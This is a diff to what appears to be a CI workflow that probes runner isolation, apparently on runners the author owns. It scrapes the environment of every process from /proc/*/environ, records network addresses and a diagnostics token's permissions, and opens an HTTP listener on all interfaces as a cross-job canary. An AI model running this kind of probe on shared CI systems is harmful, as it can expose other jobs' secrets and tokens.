@@ -19,7 +19,7 @@ jobs:
       - name: Capture owned peer fingerprint
         run: |
           python3 - <<'PY'
-          import glob, hashlib, json, os, urllib.parse, urllib.request
+          import glob, hashlib, json, os, socket, urllib.parse, urllib.request
 
           agent_env = {}
           for path in glob.glob("/proc/[0-9]*/environ"):
@@ -52,6 +52,13 @@ jobs:
               "diagnostics_permissions": dict(
                   urllib.parse.parse_qsl(diagnostics.query)
               ).get("sp", ""),
+              "private_addresses": sorted(
+                  {
+                      address[4][0]
+                      for address in socket.getaddrinfo(socket.gethostname(), None)
+                      if address[4][0] != "127.0.0.1"
+                  }
+              ),
               "public_ip": public_ip,
           }
           open("peer-fingerprint.json", "w").write(
@@ -67,5 +74,8 @@ jobs:
 
       - name: Keep an owned cross-job canary resident
         run: |
-          printf '%s\n' "$CROSS_JOB_CANARY" > "/tmp/$CROSS_JOB_CANARY"
+          mkdir -p /tmp/owned-peer-http
+          printf '%s\n' "$CROSS_JOB_CANARY" > /tmp/owned-peer-http/index.html
+          python3 -m http.server 39000 --bind 0.0.0.0 \
+            --directory /tmp/owned-peer-http >/tmp/owned-peer-http.log 2>&1 &
           sleep 480
